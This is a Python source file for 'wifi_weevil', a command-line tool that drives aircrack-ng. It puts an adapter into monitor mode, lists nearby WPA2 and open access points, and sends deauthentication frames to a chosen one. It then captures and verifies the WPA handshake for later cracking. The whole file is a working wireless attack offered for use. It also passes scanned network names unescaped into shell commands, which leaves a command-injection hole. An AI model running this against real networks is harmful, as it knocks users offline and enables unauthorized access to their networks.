from subprocess import *
import signal
import os
from ansi.colour import fg, bg
from ansi.colour.fx import reset
from time import sleep
from time import time
import getopt, sys
import pandas
from halo import Halo
import numpy as np

# ——— Create global variables
this_dir = (os.path.split(os.path.realpath(__file__))[0])
weevil_version = '0.0.2'

adap_pref = ""

my_selection = {
    "my_adapter":None,
    'my_bssid':None,
    'my_essid':None,
    'my_channel':None,
}

base_t = 8

# ——— Authenticate user
def authenticate():
    if os.geteuid() == 0: # Ensure user is not root
        print("\u001b[31mDo not run as root!")
        sys.exit() # Exit
    run([f'sudo echo "wifi_weevil (v{weevil_version})"'],shell=True)

# ——— Print help menu
def usage():
    print(f"{str(reset)}{fg.green}\nwifi_weevil (v {weevil_version}){str(reset)}")
    print(f"{fg.blue}by antievil\n{str(reset)}")
    print(f"-h, --help")
    print(f"-s, --start : begin wifi weevil")
    print(f"-t, --time : time in seconds to search for access points")
    print(f"-r, --reconnect : stop airmon-ng and restart network connections if lost")
    print(str(reset))

# ——— Clear terminal when needed
def clr():
    import os
    clear = lambda: os.system('clear')
    clear()

# ——— Print title
def tl():
    clr()
    print(fg.green + bg.black + "[... wifi weevil ...]" + str(reset) + "\n")

# ——— Stop monitor mode if enabled
def stop_mon():
    # ——— Get adapter names
    cmd = r"ip -o link show | awk -F': ' '{print $2}'"
    adapters = check_output([cmd],shell=True).decode().split('\n')
    adapters.pop()
    adapters.pop(0)
    this_adap=None
    for adap in adapters:
        if "mon" in adap:
            this_adap=adap # Found monitoring adapter
            break
    try:
        check_output([f"sudo airmon-ng stop {this_adap}"],shell=True) # Stop monitor mode
    except Exception:
        pass # Already closed, no need to stop

# ——— Have user select adapter, store adapter, and stop monitor mode if enabled
def select_adapter():
    # ——— Stop all monitoring adapters first
    stop_mon()
    sleep(1)

    tl() # Print title

    # ——— Print and store all available adapters
    cmd = r"ip -o link show | awk -F': ' '{print $2}'"
    out = check_output([cmd],shell=True)
    adapters = check_output([cmd],shell=True).decode().split('\n')
    adapters.pop()
    adapters.pop(0)
    out = out.decode().replace('lo\n','')
    out = '\n' + out

    for i in range(out.count("\n")-1):
        out = out.replace("\n",f'^n${fg.blue}[{i}]{str(reset)} ',1)
    out = out.replace("^n$","\n")

    if(len(adapters)==0):
        # ——— If no adapters are found, exit
        print(fg.boldred + 'No adapters found!\n' + str(reset))
        stop_mon()
        sys.exit()
    print(fg.boldblue + 'Select the index of your adapter below' + str(reset))
    print(out)

    # ——— Request number of adapter, repeating until valid input is given or user exits
    n = None
    f = False
    usr = ""
    while((not isinstance(n,int) or (n < 0 or n > len(adapters)-1)) and not usr=="exit"):
        print(fg.blue + '$' + str(reset),end=' ')
        usr = input()
        try:
            n = int(usr)
        except ValueError:
            n = None
        if(not isinstance(n,int) or (n < 0 or n > len(adapters)-1)):
            if not f:
                f = True
                print()
            print('\033[F\033[K', end='')
            print('\033[F\033[K', end='')
            if usr != "exit":
                print(fg.boldblue + f"Invalid option! Expected an index from {0} to {len(adapters)-1}" + str(reset))

    if(usr=="exit"): # If user exits, stop monitor mode and exit
        stop_mon()
        sys.exit()

    # ——— Store selected adapter in global variable
    global my_selection, adap_pref
    adap_pref = adapters[n] # Set global variable prefix to current adapter
    my_selection['my_adapter'] = adapters[n]

# ——— Put adapter in monitor mode, get APs
def start_monitor():
    tl() # Print title
    global my_selection, adap_pref

    # ——— Begin monitor mode with airmon-ng
    print(f'{str(reset)}{fg.boldyellow}(ATTEMPT){str(reset)} Place adapter into monitor mode' + str(reset))
    check_output([f"sudo airmon-ng start {my_selection['my_adapter']}"],shell=True)
    print(f'{str(reset)}{fg.boldmagenta}(SUCCESS){str(reset)} Place adapter into monitor mode' + str(reset) + '\n')

    # ——— Try searching for access points, repeat if failed, and exit if too many failures occur
    gottenAPs = False
    attempts = 0

    # ——— Once placed in monitor mode, check to see if adapter name has been shortened
    sleep(1)
    cmd = r"ip -o link show | awk -F': ' '{print $2}'"
    adapters = check_output([cmd],shell=True).decode().split('\n')
    adapters.pop()
    adapters.pop(0)
    for adap in adapters:
        if "wlan0mon" in adap:
            adap_pref="wlan0" # Change global variable prefix to shortened version if needed

    # ——— Get access points
    while(not gottenAPs and attempts < 3):
        spinner = Halo(placement='right',text=f'{str(reset)}{fg.boldyellow}(ATTEMPT){str(reset)} Search for access points{str(reset)}', spinner='line', color="white")
        spinner.start()

        # ——— Clear temp folder
        try:
            run([f"sudo rm {this_dir}/temp/aps-*.*"],shell=True,stdout=DEVNULL, stderr=DEVNULL)
        except Exception:
            pass # Temp folder is empty, no need to clear

        # ——— Output APs to csv in the temp folder
        qterm = Popen([f'sudo airodump-ng {adap_pref}mon -w {this_dir}/temp/aps --output-format csv'],
        shell=True,stdout=DEVNULL,stderr=DEVNULL,preexec_fn=os.setpgrp)

        # ——— Wait for a given time
        sleep(base_t + attempts*2)
        spinner.stop_and_persist()

        # ——— Stop airodump-ng
        os.killpg(os.getpgid(qterm.pid), signal.SIGINT)

        # ——— Validate APs
        try:
            df_tmp = pandas.read_csv(f"{this_dir}/temp/aps-01.csv")
            tmp_bssids = df_tmp['BSSID'][0]
            gottenAPs = True # Success
            continue
        except Exception:
            # ——— Failure to get access points, try again
            attempts += 1
            print(f'{str(reset)}{fg.boldred}(FAILURE){str(reset)} Search for access points | Searching again...\n' + str(reset))
            continue
    
    # ——— Timed out, could not get access points
    if(not gottenAPs):
        print(f'{str(reset)}{fg.boldred}TIMED OUT!')
        print(f'{str(reset)}{fg.boldblue}Are you using the correct kernel version?{str(reset)}',end=' ')
        run(['uname -r'],shell=True)
        print(f'{str(reset)}{fg.boldblue}Try increasing the time parameter in settings.\n')
        stop_mon()
        sys.exit() # Quit program

    # ——— Access points possibly found, read APs
    print(f'{str(reset)}{fg.boldmagenta}(SUCCESS){str(reset)} Search for access points\n' + str(reset))
    df = pandas.read_csv(f"{this_dir}/temp/aps-01.csv")

    # ——— Store all APs in a dictionary
    all_aps = {
        'bssids':(df['BSSID']),
        'essids':(df[' ESSID']),
        'channels':(df[' channel']),
        'powers':(df[' Power']),
        'privs':(df[' Privacy'])
    }

    # ——— Create new dictionary to store filtered APs
    filtered_aps = {
        'fltr_bssids':[],
        'fltr_essids':[],
        'fltr_channels':[],
        'fltr_powers':[],
        'fltr_privs':[]
    }

    # ——— Filter APs to only include those with WPA2 or OPN security
    for i in range(len(all_aps['bssids'])):
        if(len(all_aps['bssids'][i]) <= 1 or "Station" in all_aps['bssids'][i]):
            break
        if('WPA2' in all_aps['privs'][i] or 'OPN' in all_aps['privs'][i]):
            filtered_aps['fltr_bssids'].append(all_aps['bssids'][i])
            filtered_aps['fltr_essids'].append(all_aps['essids'][i][1:])
            filtered_aps['fltr_channels'].append("".join(all_aps['channels'][i].split()))
            filtered_aps['fltr_powers'].append(int(all_aps['powers'][i]))
            filtered_aps['fltr_privs'].append(all_aps['privs'][i][1:])

    # ——— Sort APs by signal strength
    idx = list(reversed(np.argsort(filtered_aps['fltr_powers'])))
    for key in filtered_aps:
        filtered_aps[key] = np.array(filtered_aps[key])[idx]

    # ——— Verify filtered APs
    if(len(filtered_aps['fltr_bssids']) < 1): # No access points found, exit
        print(f'{str(reset)}{fg.boldred}SEARCHED, BUT NO ACCESS POINTS FOUND!')
        print(f'{str(reset)}{fg.boldblue}Are you using the correct kernel version?{str(reset)}',end=' ')
        run(['uname -r'],shell=True)
        print(f'{str(reset)}{fg.boldblue}Try increasing the time parameter in settings.\n')
        stop_mon()
        sys.exit()
    
    print(fg.boldblue + 'Select the index of an access point below\n' + str(reset))

    # ——— Print filtered APs
    for i in range(len(filtered_aps['fltr_bssids'])):
        fei = filtered_aps['fltr_essids'][i]
        if len(fei) == 0:
            fei = "unknown"
        print(f"{fg.blue}[{i}]{str(reset)} {filtered_aps['fltr_bssids'][i]} ({fei}) (ch {filtered_aps['fltr_channels'][i]}){fg.grey} ({str(filtered_aps['fltr_powers'][i])} dbm) ({filtered_aps['fltr_privs'][i]})")
    print()

    # ——— Request index of access point, repeating until valid input is given or user exits
    n = None
    f = False
    usr = ""
    while((not isinstance(n,int) or (n < 0 or n > len(filtered_aps['fltr_bssids'])-1)) and not usr=="exit"):
        print(fg.blue + '$' + str(reset),end=' ')
        usr = input()
        try:
            n = int(usr)
        except ValueError:
            n = None
        if(not isinstance(n,int) or (n < 0 or n > len(filtered_aps['fltr_bssids'])-1)):
            if not f:
                f = True
                print()
            print('\033[F\033[K', end='')
            print('\033[F\033[K', end='')
            if usr != "exit":
                print(fg.boldblue + f"Invalid option! Expected an index from {0} to {len(filtered_aps['fltr_bssids'])-1}" + str(reset))
    
    if(usr=="exit"): # If user exits, stop monitor mode and exit
        stop_mon()
        sys.exit()

    # ——— Store selected AP BSSID and ESSID in global variable
    my_selection['my_bssid'] = filtered_aps['fltr_bssids'][n]
    my_fei = filtered_aps['fltr_essids'][n]
    if len(my_fei) == 0:
            my_fei = "unknown"
    my_selection['my_essid'] = my_fei

    # ——— Store selected AP channel in global variable
    my_selection['my_channel'] = int(filtered_aps['fltr_channels'][n])

# ——— Capture handshake from BSSID using deauth attack
def get_handshake():
    tl() # Print title

    # ——— Display selected AP information
    global my_selection
    print(f'{str(reset)}',end='')
    print(f'{fg.boldblue}Selected{str(reset)} {my_selection['my_bssid']} ({my_selection['my_essid']}) (channel {my_selection['my_channel']})\n')

    # ——— Create new directory for cap
    rs = my_selection['my_essid'].replace(" ","") + '_' + str(round(time()))
    try:
        run([f'sudo mkdir -m 777 {this_dir}/captured/{rs}/'],shell=True)
    except Exception:
        pass

    # ——— Start airodump-ng
    spinner = Halo(placement='right',text=f'{str(reset)}{fg.boldyellow}(ATTEMPT){str(reset)} Prepare deauth attack on AP{str(reset)}', spinner='line', color="white")
    spinner.start()
    qterm_A = Popen([f'sudo airodump-ng -c {str(my_selection['my_channel'])} --bssid {str(my_selection['my_bssid'])} -w {this_dir}/captured/{rs}/hand {adap_pref}mon'],
    shell=True,stdout=DEVNULL,stderr=DEVNULL,preexec_fn=os.setpgrp)
    sleep(10) #4
    spinner.stop_and_persist()
    print(f'{str(reset)}{fg.boldmagenta}(SUCCESS){str(reset)} Prepare deauth attack on AP\n' + str(reset))

    # ——— Send deauth frame
    spinner = Halo(placement='right',text=f'{str(reset)}{fg.boldyellow}(ATTEMPT){str(reset)} Execute deauth attack on AP to capture handshake{str(reset)}', spinner='line', color="white")
    spinner.start()
    try:
        check_output([f"sudo aireplay-ng -0 1 -a {str(my_selection['my_bssid'])} {adap_pref}mon --ignore-negative-one"],shell=True)
        spinner.stop_and_persist()
    except Exception: # Could not execute deauth attack
        spinner.stop_and_persist()
        print(f'{str(reset)}{fg.boldred}(FAILURE){str(reset)} Execute deauth attack on AP to capture handshake' + str(reset) + '\n')
        print(fg.boldred + 'DEAUTH FAILED!')
        print(fg.boldblue + 'Try moving closer to the access point.\n')
        stop_mon()
        sys.exit() # Exit
        
    print(f'{str(reset)}{fg.boldmagenta}(SUCCESS){str(reset)} Execute deauth attack on AP to capture handshake' + str(reset) + '\n')
    
    # ——— Wait for handshake
    spinner = Halo(placement='right',text=f'{str(reset)}{fg.boldyellow}(ATTEMPT){str(reset)} Wait for handshake and verify{str(reset)}', spinner='line', color="white")
    spinner.start()
    sleep(8)
    os.killpg(qterm_A.pid, signal.SIGINT)

    # ——— Verify handshake capture
    cap_data = str(check_output([f'aircrack-ng {this_dir}/captured/{rs}/hand-01.cap'],shell=True))
    hand_count = -1
    try:
        hand_index = cap_data.index('WPA (')+5
        hand_count = int(cap_data[hand_index:hand_index+1])
    except Exception:
        pass # Unknown encryption, could not get handshake
    if(hand_count < 1):
        # ——— Could not verify cap, bail
        spinner.stop_and_persist()
        print(f'{str(reset)}{fg.boldred}(FAILURE){str(reset)} Wait for handshake and verify' + str(reset) + '\n')
        print(fg.boldred + 'HANDSHAKE CAPTURE FAILED!')
        print(fg.boldblue + 'Try moving closer to the access point.\n')
        stop_mon()
        sys.exit() # Exit
    
    # ——— Export BSSID to txt file
    check_output([f'echo "{my_selection['my_bssid']}" > {this_dir}/captured/{rs}/{my_selection['my_essid']}_bssid.txt'],shell=True)

    spinner.stop_and_persist()
    print(f'{str(reset)}{fg.boldmagenta}(SUCCESS){str(reset)} Wait for handshake and verify' + str(reset) + '\n')
    print(fg.boldblue + 'HANDSHAKE CAPTURE SUCCEEDED!\n' + str(reset))

    sleep(1)

    # ——— Open directory
    print(fg.boldblue + f'Exported to {str(reset)}{this_dir}/captured/{rs}/' + str(reset) + '\n')
    os.system(f'xdg-open {this_dir}/captured/{rs}/')

    # ——— Stop monitor mode
    stop_mon()

# ——— Follow guide to choose an adapter, begin monitoring, run a deauth attack, and capture handshake
def guide_usr():
    authenticate()
    select_adapter()
    start_monitor()
    get_handshake()

# ——— Main function to run program, parse arguments, and call other functions
def main():
    
    try: # Parse arguments
        opts, args = getopt.getopt(sys.argv[1:], "shrt:", ["start","help","reconnect","time="])
    except getopt.GetoptError as err:
        print(str(err))
        usage()
        sys.exit(2)

    for o, a in opts: # Run program with arguments
        if o in ("-r", "--reconnect"):
            stop_mon()
            sys.exit()
        elif o in ("-s", "--start"):
            guide_usr()
            stop_mon()
            sys.exit()
        elif o in ("-h", "--help"):
            usage()
            sys.exit()
        elif o in ("-t", "--time"):
            global base_t
            base_t = int(a)
            guide_usr()
            stop_mon()
            sys.exit()
        else:
            assert False, "unhandled option"

    if(len(opts)==0): # If no arguments are given, run normally
        guide_usr()
        stop_mon()
        sys.exit()

# ——— Run main function
if __name__ == "__main__":
    main()